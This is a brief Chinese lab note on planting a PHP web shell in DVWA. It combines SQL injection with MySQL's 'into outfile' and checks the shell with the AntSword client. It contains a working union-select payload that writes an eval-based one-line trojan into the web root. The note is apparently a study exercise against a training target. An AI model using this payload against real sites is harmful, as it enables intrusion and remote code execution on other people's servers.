### 1、原理
```yaml
1、使用php一句话木马
2、sql语句：into outfile上传文件
```
### 2、注入DVWA
#### 从第二个显示位，进行注入，把第二个显示位的内容，get_shell.php，存入服务器的/var/www/html/目录下
```sql
'union select 1,"<?php eval($_POST['a']);" into outfile '/var/www/html/get_shell.php
```
![image](https://github.com/498946975/Security/blob/master/images/get_shell_1.png)

### 3、上传成功之后，用蚁剑进行验证
![image](https://github.com/498946975/Security/blob/master/images/get_shell_2.png)
![image](https://github.com/498946975/Security/blob/master/images/get_shell_3.png)